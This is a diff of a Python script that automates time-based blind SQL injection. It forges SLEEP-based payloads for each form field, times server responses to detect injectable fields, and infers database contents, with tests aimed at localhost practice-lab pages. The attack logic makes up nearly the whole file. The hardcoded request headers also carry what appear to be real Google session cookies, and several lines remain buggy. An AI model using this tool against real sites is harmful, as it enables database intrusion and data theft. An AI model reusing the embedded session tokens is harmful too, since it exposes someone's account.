@@ -58,42 +58,37 @@ def makeRequest(url, method, headers = {}, cookies = {}, data = {}):
 	if method == METHODS[GET]:
 		return requests.get(url, headers = headers, cookies = cookies, params = data.items())
 	elif method == METHODS[POST]:
-		return requests.post(url, headers = headers, cookies = cookies, params = data.items())
+		return requests.post(url, headers = headers, cookies = cookies, data = data.items())
 	else:
 		return None
 
-def measureRequestTime(request):
+def getRequestTime(request):
 	return request.elapsed.total_seconds();
 
 def meanTime(times):
 	if len(times) == 1:
 		return times[0]
-	
 	times.pop(indexOfMax(times))
-	
 	if len(times) > 1:
 		times.pop(indexOfMax(times))
-
 	return meanValue(times)
 
+
 def measureServerResponseTime(url, method, headers = {}, cookies = {}, data = {}):
-	return measureRequestTime(makeRequest(url, method, headers, cookies, data))
+	return getRequestTime(makeRequest(url, method, headers, cookies, data))
+
 
 def measureMeanServerResponseTime(url, method, headers = {}, cookies = {}, data = {}):
 	global threadsNum
-
-	if threadsNum <= 1:
-		return measureServerResponseTime(url, method, headers, cookies, data)
-	else:
-		times = []
-		threads = []
-		for i in range(threadsNum):
-			t = httpRequestsThread(i, 'Thread-' + str(i), url, method, headers, cookies, data, times)
-			t.start()
-			threads.append(t)
-		for t in threads:
-			t.join()
-		return meanTime(times)
+	times = []
+	threads = []
+	for i in range(threadsNum):
+		t = httpRequestsThread(i, 'Thread-' + str(i), url, method, headers, cookies, data, times)
+		t.start()
+		threads.append(t)
+	for t in threads:
+		t.join()
+	return meanTime(times)
 
 def measureMeanServerResponseTimePrecise(url, method, headers = {}, cookies = {}, data = {}, roundsNum = 1):
 	times = []
@@ -101,22 +96,21 @@ def measureMeanServerResponseTimePrecise(url, method, headers = {}, cookies = {}
 		times.append(measureMeanServerResponseTime(url, method, headers, cookies, data))
 	return meanTime(times)
 
-def sleepTime(serverResponseTime):
-	if response_time < 0.1:
-		return response_time * 10
-	elif response_time >= 0.1 and response_time < 1:
+def calculateSleepTime(serverResponseTime):
+	if serverResponseTime < 0.1:
+		return serverResponseTime * 10
+	elif serverResponseTime >= 0.1 and serverResponseTime < 1:
 		return response_time * 5
-	elif response_time >= 1 and response_time < 5:
-		return response_time
-	elif response_time >= 5:
-		return response_time * 0.5
+	elif serverResponseTime >= 1 and serverResponseTime < 5:
+		return serverResponseTime
+	elif serverResponseTime >= 5:
+		return serverResponseTime * 0.5
 
 
 # Checks if a form field is vulnerable
 # Correctly forged data are passed to this function to test if the field is injectable
 def isVulnerable(url, method, headers, cookies, data):
 	global sleepTime
-
 	if measureMeanServerResponseTime(url, method, headers, cookies, data) >= sleepTime:
 		return True
 	return False
@@ -129,7 +123,7 @@ def searchFieldVulnerabilities(url, method, headers, cookies, field, data):
 		for s in SQL_SUFFIXES:
 			suff = s
 			if suff == SQL_SUFFIXES[AND_SUFFIX_1]:
-				suff.format(q, q, q)
+				suff = suff.format(q, q, q)
 			mData[field] = data[field] + sql.format(q, sleepTime, suff)
 			if isVulnerable(url, method, headers, cookies, mData):
 				return {'quoteType':q, 'suffixType': suff}
@@ -140,8 +134,8 @@ def searchFieldVulnerabilities(url, method, headers, cookies, field, data):
 def searchVulnerableFields(url, method, headers, cookies, data):
 	vulnerableFields = {}
 	for field in data:
-		vulnerabilities = testFieldVulnerabilities(url, method, headers, cookies, field, data)
-		if d is not None:
+		vulnerabilities = searchFieldVulnerabilities(url, method, headers, cookies, field, data)
+		if vulnerabilities is not None:
 			vulnerableFields.update({field:vulnerabilities})
 
 	return vulnerableFields
@@ -149,8 +143,7 @@ def searchVulnerableFields(url, method, headers, cookies, data):
 
 def buildSqlInjection(query, operand, value, vulnerabilityType):
 	global sleepTime
-	return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'
-		.format(vulnerabilityType['quoteType'], query, operand, value, sleepTime, vulnerabilityType['suffixType'])
+	return '{} AND IF(({}){}{},SLEEP({}),SLEEP(0)) {}'.format(vulnerabilityType['quoteType'], query, operand, value, sleepTime, vulnerabilityType['suffixType'])
 
 
 # vulnerableField --> {vulnerableField:{'quoteType':q, 'suffixType':suff}}
@@ -165,6 +158,8 @@ def searchTableRowsCount(url, method, headers, cookies, data, vulnerableField, d
 	found = False
 	count = 0
 
+	# Da usare per referenziare i tipi di vulnerabilità
+	fields[fields.keys()[0]]['suffixType']
 
 	while not found:
 		mData[vulnerableField.keys()] = data[vulnerableField.keys()] + buildSqlInjection(query, '=', str(count), vulnerableField.values())
@@ -181,8 +176,9 @@ def main(argv):
 	parser = argparse.ArgumentParser(description = '')
 	parser.add_argument('-u', '--url', help = 'The URL on which try the attack.')
 	parser.add_argument('-d', '--data', help = 'Payload for data fields. {\'<field>\': \'<value>\',...}', default = '\'{{}}\'')
+	parser.add_argument('--headers')
+	parser.add_argument('--cookies')
 	parser.add_argument('-m', '--method', help = 'The method <GET|POST>.', metavar = '<GET|POST>', default = METHODS[GET], choices = METHODS)
-	parser.add_argument('-s', '--sleep', type = int, help = 'The sleep time to use')
 	parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
 	args = parser.parse_args()
 
@@ -192,7 +188,17 @@ def main(argv):
 		parser.print_help()
 		sys.exit()
 	'''
+	
+
+
+	global threadsNum
+	global sleepTime
 	url = args.url
+	method = args.method
+	headers = args.headers
+	cookies = args.cookies
+	data = args.data
+	threadsNum = args.threads
 
 	headers = {
     'authority': 'www.google.it',
@@ -205,13 +211,33 @@ def main(argv):
     'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
     'cookie': 'CONSENT=WP.26c729; SID=DQaa1w0eP2SrWqJCJ8PSrMY2kJItAjkhUxKsYySGuYoW3c1pWzh4l0YskRalJ9oPNsIapQ.; HSID=AMjQsZklKuOKf8YqH; SSID=AtxT-ZkomyLldldY2; APISID=2wG4BoZa9_xU-qrc/Am8FMZ0ILIuaO-YvH; SAPISID=Aci4x-FLLURLG-BR/AleShpCCjRFzspq1e; NID=128=IXQAvzsMy-yRhkqW7yApnwxrg3uSOTA7B9N5bdprmXCmbxD_HY7vVSCKWup9HO7_QJxxmtleMzkmaUEev9cGQyiLPuQPlCIc2fhtVIKHl6HYDcH3r2Daca3VWQVyVeRR8A1IBD_woYGAnfZnwsHL2OBssmyUvBxKrrR9sxl2lfp2w49lsFoWmrXSr99cAynak98uAdlYoKd-SDCKJRUupoDlwjTbBZaJCr-lra1cug; 1P_JAR=2018-4-27-14',
 	}
-	# print measureMeanServerResponseTimePrecise('http://www.google.it', 'GET', {}, {}, {}, 1, 4)
-	r = makeRequest(url, 'GET', headers, {}, {})
-
-	print r.text
-
 	
- 
+
+
+	# Test1
+	url1 = 'http://localhost/cyber-gym/sqli/time_based_blind.php'
+	data1 = {'email':'arthur@guide.com'}
+	method1 = METHODS[GET]
+
+	responseTime = measureMeanServerResponseTime(url1, method1, headers, {}, data1)
+	sleepTime = calculateSleepTime(responseTime)
+	fields = searchVulnerableFields(url1, method1, headers, {}, data1)
+	
+	print fields[fields.keys()[0]]['suffixType']
+
+'''
+
+	# Test2
+	url2 = 'http://localhost/cyber-gym/sqli/time_based_blind_escaped.php'
+	data2 = {'to':'1', 'msg':''}
+	method2 = METHODS[POST]
+	responseTime = measureMeanServerResponseTime(url2, method2, headers, {}, data2)
+	sleepTime = calculateSleepTime(responseTime)
+	fields = searchVulnerableFields(url2, method2, headers, {}, data2)
+	print
+	print
+	print fields
+'''
 if __name__ == "__main__":
 	main(sys.argv[1:])
     
